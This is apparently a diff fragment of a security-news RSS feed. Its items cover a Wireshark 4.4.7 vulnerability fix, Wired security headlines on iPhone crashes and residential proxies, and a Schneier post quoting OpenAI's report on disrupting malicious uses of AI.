- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32022</guid></item><item><title>Wireshark 4.4.7 Released, (Sun, Jun 8th)</title><link>https://isc.sans.edu/diary/rss/32020</link><description>&lt;p&gt;Wireshark release &lt;a href="https://www.wireshark.org/docs/relnotes/wireshark-4.4.7.html"&gt;4.4.7&lt;/a&gt; fixes 1 vulnerability (&amp;#x25;&amp;#x25;cve:2025-5601&amp;#x25;&amp;#x25;) and 8 bugs.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Wireshark release &lt;a href="https://www.wireshark.org/docs/relnotes/wireshark-4.4.7.html"&gt;4.4.7&lt;/a&gt; fixes 1 vulnerability (%%cve:2025-5601%%) and 8 bugs.&lt;/p&gt;
-
-&lt;p&gt;Didier Stevens&lt;br /&gt;
-Senior handler&lt;br /&gt;
-&lt;a href="http://blog.DidierStevens.com"&gt;blog.DidierStevens.com&lt;/a&gt;&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32020</guid></item><item><title>The Mystery of iPhone Crashes That Apple Denies Are Linked to Chinese Hacking</title><link>https://www.wired.com/story/mystery-of-iphone-crashes-that-apple-denies-are-linked-to-chinese-hacking/</link><description>Plus: A 22-year-old former intern gets put in charge of a key anti-terrorism program, threat intelligence firms finally wrangle their confusing names for hacker groups, and more.</description><guid isPermaLink="false">68431354546bf069da326828</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>security roundup</category><category>cybersecurity</category><category>encryption</category><category>China</category><category>hacking</category><category>national security</category><category>terrorism</category><category>iPhone</category><category>Department of Homeland Security</category><category>Security Roundup</category></item><item><title>Cybercriminals Are Hiding Malicious Web Traffic in Plain Sight</title><link>https://www.wired.com/story/cybercriminals-are-hiding-malicious-web-traffic-in-plain-sight/</link><description>In an effort to evade detection, cybercriminals are increasingly turning to “residential proxy” services that cover their tracks by making it look like everyday online activity.</description><guid isPermaLink="false">6840728a77f73e0f1607d48a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / Privacy</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>hacking</category><category>Crime</category><category>hackers</category><category>VPN</category><category>All Mixed Up</category></item><item><title>Report on the Malicious Uses of AI</title><link>https://www.schneier.com/blog/archives/2025/06/report-on-the-malicious-uses-of-ai.html</link><description>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32022</guid></item><item><title>The Mystery of iPhone Crashes That Apple Denies Are Linked to Chinese Hacking</title><link>https://www.wired.com/story/mystery-of-iphone-crashes-that-apple-denies-are-linked-to-chinese-hacking/</link><description>Plus: A 22-year-old former intern gets put in charge of a key anti-terrorism program, threat intelligence firms finally wrangle their confusing names for hacker groups, and more.</description><guid isPermaLink="false">68431354546bf069da326828</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>security roundup</category><category>cybersecurity</category><category>encryption</category><category>China</category><category>hacking</category><category>national security</category><category>terrorism</category><category>iPhone</category><category>Department of Homeland Security</category><category>Security Roundup</category></item><item><title>Cybercriminals Are Hiding Malicious Web Traffic in Plain Sight</title><link>https://www.wired.com/story/cybercriminals-are-hiding-malicious-web-traffic-in-plain-sight/</link><description>In an effort to evade detection, cybercriminals are increasingly turning to “residential proxy” services that cover their tracks by making it look like everyday online activity.</description><guid isPermaLink="false">6840728a77f73e0f1607d48a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / Privacy</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>hacking</category><category>Crime</category><category>hackers</category><category>VPN</category><category>All Mixed Up</category></item><item><title>Report on the Malicious Uses of AI</title><link>https://www.schneier.com/blog/archives/2025/06/report-on-the-malicious-uses-of-ai.html</link><description>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;By using AI as a force multiplier for our expert investigative teams, in the three months since our last report we’ve been able to detect, disrupt and expose abusive activity including social engineering, cyber espionage, deceptive employment schemes, covert influence operations and scams. &lt;/p&gt;
 &lt;p&gt;These operations originated in many parts of the world, acted in many different ways, and focused on many different targets. A significant number appeared to originate in China: Four of the 10 cases in this report, spanning social engineering, covert influence operations and cyber threats, likely had a Chinese origin. But we’ve disrupted abuses from many other countries too: this report includes case studies of a likely task scam from Cambodia, comment spamming apparently from the Philippines, covert influence attempts potentially linked with Russia and Iran, and deceptive employment schemes...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;By using AI as a force multiplier for our expert investigative teams, in the three months since our last report we’ve been able to detect, disrupt and expose abusive activity including social engineering, cyber espionage, deceptive employment schemes, covert influence operations and scams. &lt;/p&gt;
